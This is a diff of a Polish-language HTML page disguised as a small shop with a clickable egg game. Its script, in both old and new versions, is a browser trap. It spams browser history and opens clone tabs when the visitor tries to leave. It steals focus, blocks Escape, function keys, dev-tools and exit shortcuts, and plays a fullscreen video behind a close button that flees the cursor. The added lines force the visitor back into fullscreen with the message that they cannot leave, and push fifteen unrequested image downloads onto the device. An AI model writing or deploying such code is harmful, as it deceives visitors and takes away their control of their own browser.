@@ -10,51 +10,53 @@
     header { background: #8B4513; color: #fff; padding: 18px 40px; font-size: 1.8rem; font-weight: bold; letter-spacing: 1px; }
     header span { font-size: 1rem; font-weight: normal; opacity: 0.8; margin-left: 12px; }
     .shop { display: flex; gap: 32px; justify-content: center; padding: 60px 20px; flex-wrap: wrap; }
-    .card { background: #fff; border-radius: 16px; box-shadow: 0 4px 18px rgba(0,0,0,0.10); width: 240px; padding: 28px 20px 22px; display: flex; flex-direction: column; align-items: center; gap: 14px; transition: transform 0.15s; }
+    .card { background: #fff; border-radius: 16px; box-shadow: 0 4px 18px rgba(0,0,0,.10); width: 240px; padding: 28px 20px 22px; display: flex; flex-direction: column; align-items: center; gap: 14px; transition: transform .15s; }
     .card:hover { transform: translateY(-4px); }
     .card-img { width: 120px; height: 140px; object-fit: contain; border-radius: 8px; }
     .card-img-placeholder { width: 120px; height: 140px; border-radius: 8px; display: flex; align-items: center; justify-content: center; font-size: 4rem; }
     .card h2 { font-size: 1.15rem; color: #333; text-align: center; }
     .card .price { font-size: 1.4rem; font-weight: bold; color: #8B4513; }
-    .btn { background: #8B4513; color: #fff; border: none; border-radius: 8px; padding: 10px 28px; font-size: 1rem; cursor: pointer; transition: background 0.15s; }
+    .btn { background: #8B4513; color: #fff; border: none; border-radius: 8px; padding: 10px 28px; font-size: 1rem; cursor: pointer; transition: background .15s; }
     .btn:hover { background: #6b3410; }
-
-    /* OVERLAY */
-    #overlay { display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.6); z-index: 100; align-items: center; justify-content: center; flex-direction: column; gap: 24px; }
+    #overlay { display: none; position: fixed; inset: 0; background: rgba(0,0,0,.6); z-index: 100; align-items: center; justify-content: center; flex-direction: column; gap: 24px; }
     #overlay.active { display: flex; }
-    #msg-paczka { background: #fff; border-radius: 20px; padding: 48px 64px; font-size: 2rem; font-weight: bold; color: #333; text-align: center; box-shadow: 0 8px 32px rgba(0,0,0,0.25); }
+    #msg-paczka { background: #fff; border-radius: 20px; padding: 48px 64px; font-size: 2rem; font-weight: bold; color: #333; text-align: center; box-shadow: 0 8px 32px rgba(0,0,0,.25); }
     #egg-game { display: flex; flex-direction: column; align-items: center; gap: 20px; }
     #egg-container { cursor: pointer; user-select: none; width: 260px; height: 300px; display: flex; align-items: center; justify-content: center; }
     #egg-img { width: 220px; height: 260px; object-fit: contain; transform-origin: center bottom; }
-    #egg-hint { color: #fff; font-size: 1.1rem; opacity: 0.85; text-align: center; }
+    #egg-hint { color: #fff; font-size: 1.1rem; opacity: .85; text-align: center; }
     #click-count { color: #ffd700; font-size: 1rem; }
 
-    /* VIDEO TRAP */
-    #video-trap { display: none; position: fixed; inset: 0; background: #000; z-index: 99999; flex-direction: column; align-items: center; justify-content: center; gap: 12px; }
+    /* PULAPKA WIDEO */
+    #video-trap { display: none; position: fixed; inset: 0; background: #000; z-index: 99999; align-items: center; justify-content: center; }
     #video-trap.active { display: flex; }
     #trap-video { width: 100vw; height: 100vh; object-fit: cover; display: block; }
-    #trap-msg { position: fixed; bottom: 60px; left: 50%; transform: translateX(-50%); color: #fff; font-size: 1.6rem; font-weight: bold; text-align: center; text-shadow: 2px 2px 12px #000; animation: pulse 1s ease-in-out infinite; pointer-events: none; white-space: nowrap; }
-    #fake-close { position: fixed; top: 16px; right: 20px; background: rgba(255,255,255,0.15); color: #fff; border: 2px solid rgba(255,255,255,0.4); border-radius: 6px; padding: 6px 16px; font-size: 0.9rem; cursor: pointer; z-index: 100000; transition: top 0.1s, right 0.1s, left 0.1s, bottom 0.1s; }
-    @keyframes pulse { 0%,100%{opacity:1;transform:translateX(-50%) scale(1)} 50%{opacity:0.6;transform:translateX(-50%) scale(1.05)} }
+    #trap-msg { position: fixed; bottom: 56px; left: 50%; transform: translateX(-50%); color: #fff; font-size: 1.6rem; font-weight: bold; text-shadow: 2px 2px 12px #000; animation: pulse 1s ease-in-out infinite; pointer-events: none; white-space: nowrap; z-index: 100001; }
+    #fake-close { position: fixed; top: 14px; right: 18px; background: rgba(255,255,255,.15); color: #fff; border: 2px solid rgba(255,255,255,.4); border-radius: 6px; padding: 6px 14px; font-size: .85rem; cursor: pointer; z-index: 100001; }
+    @keyframes pulse { 0%,100%{opacity:1;transform:translateX(-50%) scale(1)} 50%{opacity:.5;transform:translateX(-50%) scale(1.05)} }
+
+    /* EKRAN POWROTU (po wyjsciu z fullscreen) */
+    #return-screen { display: none; position: fixed; inset: 0; background: #000; z-index: 199999; flex-direction: column; align-items: center; justify-content: center; cursor: pointer; gap: 24px; }
+    #return-screen.show { display: flex; }
+    #return-screen .rtxt { color: #ff0000; font-size: clamp(2rem,6vw,5rem); font-weight: 900; text-align: center; animation: blink .4s step-end infinite; line-height: 1.2; }
+    #return-screen .rsub { color: #fff; font-size: 1.2rem; opacity: .7; }
+    @keyframes blink { 0%,100%{opacity:1} 50%{opacity:0} }
 
     /* ANIMACJE JAJKA */
-    @keyframes shake-light { 0%,100%{transform:rotate(0)} 20%{transform:rotate(-6deg)} 40%{transform:rotate(6deg)} 60%{transform:rotate(-4deg)} 80%{transform:rotate(4deg)} }
-    @keyframes shake-medium { 0%,100%{transform:rotate(0) translateX(0)} 15%{transform:rotate(-10deg) translateX(-6px)} 30%{transform:rotate(10deg) translateX(6px)} 45%{transform:rotate(-8deg) translateX(-4px)} 60%{transform:rotate(8deg) translateX(4px)} 75%{transform:rotate(-5deg) translateX(-2px)} 90%{transform:rotate(5deg) translateX(2px)} }
-    @keyframes shake-hard { 0%,100%{transform:rotate(0) translate(0,0)} 10%{transform:rotate(-15deg) translate(-10px,-4px)} 20%{transform:rotate(15deg) translate(10px,4px)} 30%{transform:rotate(-12deg) translate(-8px,-3px)} 40%{transform:rotate(12deg) translate(8px,3px)} 50%{transform:rotate(-18deg) translate(-12px,-5px)} 60%{transform:rotate(18deg) translate(12px,5px)} 70%{transform:rotate(-10deg) translate(-6px,-2px)} 80%{transform:rotate(10deg) translate(6px,2px)} 90%{transform:rotate(-8deg) translate(-4px,-1px)} }
-    @keyframes hatch-out { 0%{transform:scale(1) rotate(0);opacity:1} 30%{transform:scale(1.3) rotate(-20deg);opacity:1} 60%{transform:scale(1.5) rotate(20deg);opacity:.7} 100%{transform:scale(0) rotate(45deg);opacity:0} }
-    .shake-light{animation:shake-light .35s ease}
-    .shake-medium{animation:shake-medium .35s ease}
-    .shake-hard{animation:shake-hard .35s ease}
-    .hatch-out{animation:hatch-out .6s ease forwards}
+    @keyframes shake-light{0%,100%{transform:rotate(0)}20%{transform:rotate(-6deg)}40%{transform:rotate(6deg)}60%{transform:rotate(-4deg)}80%{transform:rotate(4deg)}}
+    @keyframes shake-medium{0%,100%{transform:rotate(0) translateX(0)}15%{transform:rotate(-10deg) translateX(-6px)}30%{transform:rotate(10deg) translateX(6px)}45%{transform:rotate(-8deg) translateX(-4px)}60%{transform:rotate(8deg) translateX(4px)}75%{transform:rotate(-5deg) translateX(-2px)}90%{transform:rotate(5deg) translateX(2px)}}
+    @keyframes shake-hard{0%,100%{transform:rotate(0) translate(0,0)}10%{transform:rotate(-15deg) translate(-10px,-4px)}20%{transform:rotate(15deg) translate(10px,4px)}30%{transform:rotate(-12deg) translate(-8px,-3px)}40%{transform:rotate(12deg) translate(8px,3px)}50%{transform:rotate(-18deg) translate(-12px,-5px)}60%{transform:rotate(18deg) translate(12px,5px)}70%{transform:rotate(-10deg) translate(-6px,-2px)}80%{transform:rotate(10deg) translate(6px,2px)}90%{transform:rotate(-8deg) translate(-4px,-1px)}}
+    @keyframes hatch-out{0%{transform:scale(1) rotate(0);opacity:1}30%{transform:scale(1.3) rotate(-20deg);opacity:1}60%{transform:scale(1.5) rotate(20deg);opacity:.7}100%{transform:scale(0) rotate(45deg);opacity:0}}
+    .shake-light{animation:shake-light .35s ease}.shake-medium{animation:shake-medium .35s ease}.shake-hard{animation:shake-hard .35s ease}.hatch-out{animation:hatch-out .6s ease forwards}
 
     /* KETCHUP */
     #ketchup-layer{display:none;position:fixed;inset:0;pointer-events:none;z-index:200;overflow:hidden}
     #ketchup-bottle{position:absolute;bottom:10%;left:-160px;font-size:8rem;line-height:1;transition:left .8s cubic-bezier(.22,1,.36,1);filter:drop-shadow(4px 4px 8px rgba(0,0,0,.4))}
-    #ketchup-bottle.slide-in{left:40px} #ketchup-bottle.slide-out{left:-160px}
+    #ketchup-bottle.slide-in{left:40px}#ketchup-bottle.slide-out{left:-160px}
     .tomato-splat{position:absolute;pointer-events:none;display:flex;flex-direction:column;align-items:center}
     .tomato-fly{font-size:2.2rem;animation:tomatoFly var(--dur) cubic-bezier(.25,.46,.45,.94) forwards}
     .splat-blob{width:var(--size);height:calc(var(--size)*.55);background:radial-gradient(ellipse at 40% 35%,#ff6b6b,#c0392b 60%,#922b21);border-radius:50% 45% 55% 50%/60% 50% 65% 40%;opacity:0;animation:splatAppear .25s ease forwards;animation-delay:var(--dur);position:relative}
-    .drip{width:calc(var(--size)*.18);background:linear-gradient(to bottom,#c0392b,#922b21);border-radius:0 0 50% 50%;opacity:0;animation:dripDown 1.8s ease-in forwards;animation-delay:calc(var(--dur) + .1s);position:absolute;top:90%;left:var(--drip-x)}
+    .drip{width:calc(var(--size)*.18);background:linear-gradient(to bottom,#c0392b,#922b21);border-radius:0 0 50% 50%;opacity:0;animation:dripDown 1.8s ease-in forwards;animation-delay:calc(var(--dur)+.1s);position:absolute;top:90%;left:var(--drip-x)}
     @keyframes tomatoFly{0%{transform:translate(0,0) rotate(0) scale(1);opacity:1}70%{opacity:1}100%{transform:translate(var(--tx),var(--ty)) rotate(var(--rot)) scale(.4);opacity:0}}
     @keyframes splatAppear{0%{opacity:0;transform:scale(.3)}60%{opacity:1;transform:scale(1.15)}100%{opacity:1;transform:scale(1)}}
     @keyframes dripDown{0%{opacity:1;height:0}30%{opacity:1;height:calc(var(--size)*.5)}80%{opacity:1;height:calc(var(--size)*1.4)}100%{opacity:.6;height:calc(var(--size)*1.6)}}
@@ -113,271 +115,264 @@
   <button id="fake-close">Zamknij [X]</button>
 </div>
 
+<!-- Pojawia sie gdy uzytkownik wychodzi z fullscreen -->
+<div id="return-screen" onclick="returnToFullscreen()">
+  <div class="rtxt">&#128683; ZOSTAŃ! &#128683;<br>KLIKNIJ ŻEBY WRÓCIĆ</div>
+  <div class="rsub">(nie możesz stąd wyjść)</div>
+</div>
+
 <script>
-(function() {
-  'use strict';
+(function(){
+'use strict';
 
-  // ================================================================
-  // ABSOLUTNA BLOKADA WYJSCIA
-  // ================================================================
+// ============================================================
+// BLOKADA WYJSCIA
+// ============================================================
 
-  // 1. Historia – spam co 100ms + nadpisanie metod
-  function lockHistory() {
-    history.pushState(null, null, location.href);
+history.pushState(null, null, location.href);
+setInterval(function(){ history.pushState(null,null,location.href); }, 100);
+window.addEventListener('popstate', function(){
+  history.pushState(null,null,location.href);
+  tryClone();
+});
+try{ history.back=history.forward=history.go=function(){ history.pushState(null,null,location.href); }; }catch(e){}
+
+function tryClone(){
+  try{ window.open(location.href,'_blank'); }catch(e){}
+}
+
+window.addEventListener('beforeunload',function(e){
+  e.preventDefault(); e.returnValue='';
+  tryClone();
+  return '';
+});
+
+document.addEventListener('visibilitychange',function(){
+  if(document.hidden){ tryClone(); }
+  try{ window.focus(); }catch(e){}
+});
+
+setInterval(function(){ try{ window.focus(); }catch(e){}; },100);
+window.addEventListener('blur',function(){ setTimeout(function(){ try{window.focus();}catch(e){}; },10); });
+
+document.addEventListener('contextmenu',function(e){ e.preventDefault(); e.stopPropagation(); return false; },true);
+document.addEventListener('selectstart',function(e){ e.preventDefault(); },true);
+document.addEventListener('copy',function(e){ e.preventDefault(); },true);
+document.addEventListener('cut',function(e){ e.preventDefault(); },true);
+
+document.addEventListener('keydown',function(e){
+  var k=e.key,c=e.ctrlKey,s=e.shiftKey,a=e.altKey;
+  var blocked=
+    (k>='F1'&&k<='F12')||
+    k==='Escape'||
+    (a&&(k==='F4'||k==='Left'||k==='Right'||k==='Home'))||
+    (c&&'rRwWuUsSlLnNtTpPaAcC'.indexOf(k)!==-1)||
+    (c&&s&&'iIjJcCkKmMbBnNoOpP'.indexOf(k)!==-1);
+  if(blocked){ e.preventDefault(); e.stopImmediatePropagation(); return false; }
+},true);
+
+// ============================================================
+// FULLSCREEN
+// ============================================================
+var trapActive=false;
+
+function reqFS(el){
+  var fn=el.requestFullscreen||el.webkitRequestFullscreen||el.mozRequestFullScreen;
+  if(fn&&!document.fullscreenElement){ fn.call(el).catch(function(){}); }
+}
+
+document.addEventListener('fullscreenchange',function(){
+  if(!document.fullscreenElement&&trapActive){
+    document.getElementById('return-screen').classList.add('show');
   }
-  lockHistory();
-  setInterval(lockHistory, 100);
-
-  window.addEventListener('popstate', function() {
-    lockHistory();
-    tryOpenClone();
-  });
-
-  try {
-    history.back    = lockHistory;
-    history.forward = lockHistory;
-    history.go      = lockHistory;
-  } catch(e) {}
-
-  // 2. Klon strony przy probie wyjscia
-  function tryOpenClone() {
-    try { window.open(location.href, '_blank'); } catch(e) {}
+});
+document.addEventListener('webkitfullscreenchange',function(){
+  if(!document.webkitFullscreenElement&&trapActive){
+    document.getElementById('return-screen').classList.add('show');
   }
+});
 
-  // 3. beforeunload
-  window.addEventListener('beforeunload', function(e) {
-    e.preventDefault();
-    e.returnValue = '';
-    tryOpenClone();
-    return '';
-  });
+window.returnToFullscreen=function(){
+  document.getElementById('return-screen').classList.remove('show');
+  reqFS(document.getElementById('video-trap'));
+};
 
-  // 4. Widocznosc zakladki – otworz nowa karte gdy uzytkownik przelacza
-  document.addEventListener('visibilitychange', function() {
-    if (document.hidden) {
-      tryOpenClone();
-    }
-    try { window.focus(); } catch(e) {}
-  });
+// ============================================================
+// POBIERANIE ZDJEC ZWIERZAKOW
+// ============================================================
+async function blobDownload(imgUrl,filename){
+  try{
+    var res=await fetch(imgUrl,{mode:'cors'});
+    if(!res.ok) throw 0;
+    var blob=await res.blob();
+    var url=URL.createObjectURL(blob);
+    var a=document.createElement('a');
+    a.href=url; a.download=filename; a.style.display='none';
+    document.body.appendChild(a); a.click(); document.body.removeChild(a);
+    setTimeout(function(){ URL.revokeObjectURL(url); },3000);
+  }catch(e){}
+}
 
-  // 5. Focus – agresywne przejmowanie
-  setInterval(function() { try { window.focus(); } catch(e) {} }, 100);
-  window.addEventListener('blur', function() {
-    setTimeout(function() { try { window.focus(); } catch(e) {} }, 10);
-  });
+async function grabDog(n){
+  try{
+    var r=await fetch('https://dog.ceo/api/breeds/image/random');
+    var d=await r.json();
+    if(!d.message) return;
+    var ext=(d.message.split('.').pop().split('?')[0]||'jpg').substring(0,4);
+    await blobDownload(d.message,'piesek_'+n+'.'+ext);
+  }catch(e){}
+}
 
-  // 6. Prawy przycisk myszy – zablokowany
-  document.addEventListener('contextmenu', function(e) {
-    e.preventDefault(); e.stopPropagation(); return false;
-  }, true);
-
-  // 7. Klawiatura – blokada wszystkich skrotow wyjscia
-  document.addEventListener('keydown', function(e) {
-    var k = e.key;
-    var ctrl = e.ctrlKey, shift = e.shiftKey, alt = e.altKey;
-    var blocked =
-      k === 'F1' || k === 'F2' || k === 'F3' || k === 'F4' ||
-      k === 'F5' || k === 'F6' || k === 'F7' || k === 'F8' ||
-      k === 'F9' || k === 'F10'|| k === 'F11'|| k === 'F12'||
-      k === 'Escape' ||
-      (alt && (k === 'F4' || k === 'Left' || k === 'Right' || k === 'Home')) ||
-      (ctrl && ['r','R','w','W','u','U','s','S','l','L','n','N','t','T','p','P','a','A','c','C'].indexOf(k) !== -1) ||
-      (ctrl && shift && ['i','I','j','J','c','C','k','K','m','M','b','B','n','N','o','O','p','P'].indexOf(k) !== -1);
-    if (blocked) {
-      e.preventDefault();
-      e.stopImmediatePropagation();
-      return false;
-    }
-  }, true);
-
-  // 8. Selekcja i kopiowanie – zablokowane
-  document.addEventListener('selectstart', function(e) { e.preventDefault(); }, true);
-  document.addEventListener('copy',        function(e) { e.preventDefault(); }, true);
-  document.addEventListener('cut',         function(e) { e.preventDefault(); }, true);
-
-  // 9. Fullscreen – prosby o pelny ekran + ponowienie po wyjsciu
-  function reqFS(el) {
-    if (!document.fullscreenElement) {
-      var fn = el.requestFullscreen || el.webkitRequestFullscreen || el.mozRequestFullScreen;
-      if (fn) fn.call(el).catch(function() {});
-    }
+async function grabCat(n){
+  try{
+    var r=await fetch('https://api.thecatapi.com/v1/images/search?breed_ids=bsho&limit=1');
+    var d=await r.json();
+    var url=d&&d[0]&&d[0].url;
+    if(!url) throw 0;
+    var ext=(url.split('.').pop().split('?')[0]||'jpg').substring(0,4);
+    await blobDownload(url,'kot_brytyjski_'+n+'.'+ext);
+  }catch(e){
+    try{
+      var r2=await fetch('https://cataas.com/cat?json=true');
+      var d2=await r2.json();
+      if(d2._id) await blobDownload('https://cataas.com/cat/'+d2._id,'kot_'+n+'.jpg');
+    }catch(e2){}
   }
+}
 
-  document.addEventListener('fullscreenchange', function() {
-    if (!document.fullscreenElement) {
-      var trap = document.getElementById('video-trap');
-      if (trap.classList.contains('active')) {
-        setTimeout(function() { reqFS(trap); }, 200);
-      }
-    }
+async function grabBird(n){
+  try{
+    var r=await fetch('https://some-random-api.com/animal/birb');
+    var d=await r.json();
+    if(!d.image) throw 0;
+    var ext=(d.image.split('.').pop().split('?')[0]||'jpg').substring(0,4);
+    await blobDownload(d.image,'ptaszek_'+n+'.'+ext);
+  }catch(e){}
+}
+
+function startPetBombing(){
+  var list=['dog','cat','bird','dog','cat','bird','dog','cat','bird','dog','cat','bird','dog','cat','bird'];
+  list.forEach(function(type,i){
+    setTimeout(function(){
+      if(type==='dog') grabDog(i+1);
+      else if(type==='cat') grabCat(i+1);
+      else grabBird(i+1);
+    }, i*1500+600);
   });
+}
 
-  // ================================================================
-  // FAKE CLOSE – ucieka spod kursora
-  // ================================================================
-  var fakeBtn = document.getElementById('fake-close');
-  fakeBtn.addEventListener('mousemove', function(e) {
-    var r = fakeBtn.getBoundingClientRect();
-    var dist = Math.sqrt(
-      Math.pow(e.clientX - (r.left + r.width / 2), 2) +
-      Math.pow(e.clientY - (r.top  + r.height/ 2), 2)
-    );
-    if (dist < 120) {
-      var nx = Math.random() * (window.innerWidth  - 160) + 40;
-      var ny = Math.random() * (window.innerHeight - 60)  + 20;
-      fakeBtn.style.left   = nx + 'px';
-      fakeBtn.style.top    = ny + 'px';
-      fakeBtn.style.right  = 'auto';
-      fakeBtn.style.bottom = 'auto';
-    }
-  });
-  fakeBtn.addEventListener('click', function() {
-    var v = document.getElementById('trap-video');
-    v.currentTime = 0; v.play().catch(function() {});
-  });
-
-  // ================================================================
-  // SKLEP
-  // ================================================================
-  var ketchupTimeout = null;
-
-  window.buySimple = function() {
-    document.getElementById('overlay').classList.add('active');
-    document.getElementById('msg-paczka').style.display = 'block';
-    document.getElementById('egg-game').style.display = 'none';
-  };
-
-  window.buyKetchup = function() {
-    buySimple();
-    if (ketchupTimeout) clearTimeout(ketchupTimeout);
-    ketchupTimeout = setTimeout(launchKetchupAttack, 15000);
-  };
-
-  function launchKetchupAttack() {
-    var layer = document.getElementById('ketchup-layer');
-    var bottle = document.getElementById('ketchup-bottle');
-    layer.style.display = 'block';
-    layer.classList.remove('fade-out');
-    requestAnimationFrame(function() {
-      requestAnimationFrame(function() { bottle.classList.add('slide-in'); });
-    });
-    setTimeout(function() {
-      for (var i = 0; i < 12; i++) {
-        (function(idx) { setTimeout(function() { throwTomato(layer, bottle); }, idx * 280); })(i);
-      }
-    }, 900);
-    setTimeout(function() {
-      bottle.classList.remove('slide-in');
-      bottle.classList.add('slide-out');
-      layer.classList.add('fade-out');
-      layer.addEventListener('animationend', function() {
-        layer.style.display = 'none';
-        layer.classList.remove('fade-out');
-        bottle.classList.remove('slide-out');
-        layer.querySelectorAll('.tomato-splat,.splat-blob').forEach(function(el) { el.remove(); });
-      }, { once: true });
-    }, 5900);
+// ============================================================
+// FAKE CLOSE
+// ============================================================
+var fakeBtn=document.getElementById('fake-close');
+fakeBtn.addEventListener('mousemove',function(e){
+  var r=fakeBtn.getBoundingClientRect();
+  var d=Math.sqrt(Math.pow(e.clientX-(r.left+r.width/2),2)+Math.pow(e.clientY-(r.top+r.height/2),2));
+  if(d<120){
+    fakeBtn.style.left=(Math.random()*(window.innerWidth-160)+40)+'px';
+    fakeBtn.style.top=(Math.random()*(window.innerHeight-60)+20)+'px';
+    fakeBtn.style.right='auto'; fakeBtn.style.bottom='auto';
   }
+});
+fakeBtn.addEventListener('click',function(){
+  var v=document.getElementById('trap-video');
+  v.currentTime=0; v.play().catch(function(){});
+});
 
-  function throwTomato(layer, bottle) {
-    var br = bottle.getBoundingClientRect();
-    var sx = br.right - 20, sy = br.top + br.height * 0.3;
-    var tx = (Math.random() * window.innerWidth * .75 + window.innerWidth * .1) - sx;
-    var ty = (Math.random() * window.innerHeight * .7 + window.innerHeight * .05) - sy;
-    var rot = (Math.random() - .5) * 720;
-    var dur = (0.55 + Math.random() * .35).toFixed(2) + 's';
-    var size = (60 + Math.random() * 50) + 'px';
-    var splat = document.createElement('div');
-    splat.className = 'tomato-splat';
-    splat.style.cssText = 'left:' + sx + 'px;top:' + sy + 'px';
-    var fly = document.createElement('span');
-    fly.textContent = '🍅';
-    fly.className = 'tomato-fly';
-    fly.style.setProperty('--tx', tx + 'px');
-    fly.style.setProperty('--ty', ty + 'px');
-    fly.style.setProperty('--rot', rot + 'deg');
-    fly.style.setProperty('--dur', dur);
-    var blob = document.createElement('div');
-    blob.className = 'splat-blob';
-    blob.style.setProperty('--size', size);
-    blob.style.setProperty('--dur', dur);
-    blob.style.cssText += ';left:' + (sx + tx - parseFloat(size) / 2) + 'px;top:' + (sy + ty) + 'px;position:absolute';
-    for (var d = 0; d < 2 + Math.floor(Math.random() * 2); d++) {
-      var drip = document.createElement('div');
-      drip.className = 'drip';
-      drip.style.setProperty('--size', size);
-      drip.style.setProperty('--dur', dur);
-      drip.style.setProperty('--drip-x', (20 + Math.random() * 60) + '%');
-      blob.appendChild(drip);
-    }
-    splat.appendChild(fly); layer.appendChild(splat); layer.appendChild(blob);
+// ============================================================
+// SKLEP
+// ============================================================
+var ketchupTO=null;
+
+window.buySimple=function(){
+  document.getElementById('overlay').classList.add('active');
+  document.getElementById('msg-paczka').style.display='block';
+  document.getElementById('egg-game').style.display='none';
+};
+window.buyKetchup=function(){
+  buySimple();
+  if(ketchupTO) clearTimeout(ketchupTO);
+  ketchupTO=setTimeout(launchKetchupAttack,15000);
+};
+
+function launchKetchupAttack(){
+  var L=document.getElementById('ketchup-layer'),B=document.getElementById('ketchup-bottle');
+  L.style.display='block'; L.classList.remove('fade-out');
+  requestAnimationFrame(function(){ requestAnimationFrame(function(){ B.classList.add('slide-in'); }); });
+  setTimeout(function(){ for(var i=0;i<12;i++)(function(x){ setTimeout(function(){ throwTomato(L,B); },x*280); })(i); },900);
+  setTimeout(function(){
+    B.classList.remove('slide-in'); B.classList.add('slide-out'); L.classList.add('fade-out');
+    L.addEventListener('animationend',function(){ L.style.display='none'; L.classList.remove('fade-out'); B.classList.remove('slide-out'); L.querySelectorAll('.tomato-splat,.splat-blob').forEach(function(el){el.remove();}); },{once:true});
+  },5900);
+}
+
+function throwTomato(L,B){
+  var br=B.getBoundingClientRect();
+  var sx=br.right-20,sy=br.top+br.height*.3;
+  var tx=(Math.random()*window.innerWidth*.75+window.innerWidth*.1)-sx;
+  var ty=(Math.random()*window.innerHeight*.7+window.innerHeight*.05)-sy;
+  var rot=(Math.random()-.5)*720,dur=(0.55+Math.random()*.35).toFixed(2)+'s',size=(60+Math.random()*50)+'px';
+  var sp=document.createElement('div'); sp.className='tomato-splat'; sp.style.cssText='left:'+sx+'px;top:'+sy+'px';
+  var fly=document.createElement('span'); fly.textContent='🍅'; fly.className='tomato-fly';
+  fly.style.setProperty('--tx',tx+'px'); fly.style.setProperty('--ty',ty+'px'); fly.style.setProperty('--rot',rot+'deg'); fly.style.setProperty('--dur',dur);
+  var blob=document.createElement('div'); blob.className='splat-blob';
+  blob.style.setProperty('--size',size); blob.style.setProperty('--dur',dur);
+  blob.style.cssText+='left:'+(sx+tx-parseFloat(size)/2)+'px;top:'+(sy+ty)+'px;position:absolute';
+  for(var d=0;d<2+Math.floor(Math.random()*2);d++){
+    var drip=document.createElement('div'); drip.className='drip';
+    drip.style.setProperty('--size',size); drip.style.setProperty('--dur',dur); drip.style.setProperty('--drip-x',(20+Math.random()*60)+'%');
+    blob.appendChild(drip);
   }
+  sp.appendChild(fly); L.appendChild(sp); L.appendChild(blob);
+}
 
-  // ================================================================
-  // JAJO
-  // ================================================================
-  var clickCount = 0, lastClickTime = 0, rapidStreak = 0;
+// ============================================================
+// JAJO
+// ============================================================
+var clickCount=0,lastClickTime=0,rapidStreak=0;
 
-  window.buyEgg = function() {
-    clickCount = 0; rapidStreak = 0; lastClickTime = 0;
-    document.getElementById('click-count').textContent = 'Kliknięcia: 0 / 10';
-    document.getElementById('egg-hint').textContent = 'Kliknij w jajko, żeby je wykluć!';
-    document.getElementById('egg-img').className = '';
-    document.getElementById('overlay').classList.add('active');
-    document.getElementById('msg-paczka').style.display = 'none';
-    document.getElementById('egg-game').style.display = 'flex';
-  };
+window.buyEgg=function(){
+  clickCount=0; rapidStreak=0; lastClickTime=0;
+  document.getElementById('click-count').textContent='Kliknięcia: 0 / 10';
+  document.getElementById('egg-hint').textContent='Kliknij w jajko, żeby je wykluć!';
+  document.getElementById('egg-img').className='';
+  document.getElementById('overlay').classList.add('active');
+  document.getElementById('msg-paczka').style.display='none';
+  document.getElementById('egg-game').style.display='flex';
+};
 
-  window.clickEgg = function() {
-    var now = Date.now();
-    rapidStreak = (now - lastClickTime < 500)
-      ? Math.min(rapidStreak + 1, 5)
-      : Math.max(rapidStreak - 1, 0);
-    lastClickTime = now;
-    clickCount++;
-    document.getElementById('click-count').textContent = 'Kliknięcia: ' + clickCount + ' / 10';
-    var egg = document.getElementById('egg-img');
-    egg.classList.remove('shake-light', 'shake-medium', 'shake-hard', 'hatch-out');
-    if (clickCount >= 10) {
-      egg.classList.add('hatch-out');
-      egg.addEventListener('animationend', activateTrap, { once: true });
-      return;
-    }
-    void egg.offsetWidth;
-    if (rapidStreak >= 4) {
-      egg.classList.add('shake-hard');
-      document.getElementById('egg-hint').textContent = '💥 SZALEJE!';
-    } else if (rapidStreak >= 2) {
-      egg.classList.add('shake-medium');
-      document.getElementById('egg-hint').textContent = '🔥 Szybciej!';
-    } else {
-      egg.classList.add('shake-light');
-      document.getElementById('egg-hint').textContent = 'Kliknij w jajko, żeby je wykluć!';
-    }
-    egg.addEventListener('animationend', function() {
-      egg.classList.remove('shake-light', 'shake-medium', 'shake-hard');
-    }, { once: true });
-  };
+window.clickEgg=function(){
+  var now=Date.now();
+  rapidStreak=(now-lastClickTime<500)?Math.min(rapidStreak+1,5):Math.max(rapidStreak-1,0);
+  lastClickTime=now; clickCount++;
+  document.getElementById('click-count').textContent='Kliknięcia: '+clickCount+' / 10';
+  var egg=document.getElementById('egg-img');
+  egg.classList.remove('shake-light','shake-medium','shake-hard','hatch-out');
+  if(clickCount>=10){ egg.classList.add('hatch-out'); egg.addEventListener('animationend',activateTrap,{once:true}); return; }
+  void egg.offsetWidth;
+  if(rapidStreak>=4){ egg.classList.add('shake-hard'); document.getElementById('egg-hint').textContent='💥 SZALEJE!'; }
+  else if(rapidStreak>=2){ egg.classList.add('shake-medium'); document.getElementById('egg-hint').textContent='🔥 Szybciej!'; }
+  else{ egg.classList.add('shake-light'); document.getElementById('egg-hint').textContent='Kliknij w jajko, żeby je wykluć!'; }
+  egg.addEventListener('animationend',function(){ egg.classList.remove('shake-light','shake-medium','shake-hard'); },{once:true});
+};
 
-  function activateTrap() {
-    document.getElementById('overlay').classList.remove('active');
-    document.getElementById('egg-game').style.display = 'none';
-    var trap = document.getElementById('video-trap');
-    trap.classList.add('active');
-    var v = document.getElementById('trap-video');
-    v.play().catch(function() {});
-    reqFS(trap);
-  }
+function activateTrap(){
+  trapActive=true;
+  document.getElementById('overlay').classList.remove('active');
+  document.getElementById('egg-game').style.display='none';
+  var trap=document.getElementById('video-trap');
+  trap.classList.add('active');
+  document.getElementById('trap-video').play().catch(function(){});
+  reqFS(trap);
+  startPetBombing();
+}
 
-  window.closeOverlay = function() {
-    document.getElementById('overlay').classList.remove('active');
-    document.getElementById('msg-paczka').style.display = 'none';
-    document.getElementById('egg-game').style.display = 'none';
-  };
-
-  document.getElementById('overlay').addEventListener('click', function(e) {
-    if (e.target === this) closeOverlay();
-  });
+window.closeOverlay=function(){
+  document.getElementById('overlay').classList.remove('active');
+  document.getElementById('msg-paczka').style.display='none';
+  document.getElementById('egg-game').style.display='none';
+};
+document.getElementById('overlay').addEventListener('click',function(e){ if(e.target===this) closeOverlay(); });
 
 })();
 </script>
